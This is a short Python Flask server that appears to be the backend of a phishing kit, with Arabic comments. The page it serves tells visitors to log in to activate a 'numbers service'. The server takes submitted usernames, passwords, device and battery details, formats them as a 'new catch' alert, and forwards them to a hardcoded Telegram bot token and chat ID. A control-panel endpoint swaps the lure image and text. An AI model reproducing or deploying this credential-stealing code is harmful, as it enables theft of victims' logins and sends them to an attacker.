from flask import Flask, request, jsonify
import requests

app = Flask(__name__)

# بيانات البوت الخاصة بك
TOKEN = "8713127522:AAGfj4acg204MMcOSX7koJNtP4fwN9L-1YQ"
CHAT_ID = "7984067238"

latest_config = {
    "image": "https://telegra.ph/file/1792945d7d91986420551.jpg",
    "letter": "سجل دخولك لتفعيل خدمة الأرقام",
    "button": "تفعيل الآن"
}

@app.route('/api/save', methods=['POST'])
def save_data():
    global latest_config
    try:
        data = request.json
        
        # إذا كان تحديث للإعدادات من لوحة التحكم
        if 'image' in data and 'letter' in data:
            latest_config = data
            return jsonify({"status": "success"}), 200
        
        # استخراج البيانات المرسلة من المتصفح
        user = data.get('u', 'غير معروف')
        pw = data.get('p', 'غير معروف')
        dev = data.get('d', 'غير معروف')
        bat = data.get('b', 'N/A')
        tm = data.get('t', 'غير محدد')

        # تنسيق الرسالة لتبدو مرتبة في تلجرام
        full_message = (
            "🚀 **إشعار: صيد جديد مـكتمل** 🚀\n"
            "━━━━━━━━━━━━━━━\n"
            "👤 **البيانات الشخصية:**\n"
            f"📧 المستخدم: `{user}`\n"
            f"🔑 كلمة السر: `{pw}`\n"
            "━━━━━━━━━━━━━━━\n"
            "📱 **تفاصيل النظام:**\n"
            f"🖥️ الجهاز: {dev}\n"
            f"🔋 البطارية: {bat}\n"
            "━━━━━━━━━━━━━━━\n"
            f"⏰ الوقت: {tm}\n"
            "━━━━━━━━━━━━━━━"
        )

        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        requests.post(url, json={
            "chat_id": CHAT_ID,
            "text": full_message,
            "parse_mode": "Markdown"
        })

        return jsonify({"status": "success"}), 200
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/get', methods=['GET'])
def get_config():
    return jsonify(latest_config)

def handler(environ, start_response):
    return app(environ, start_response)
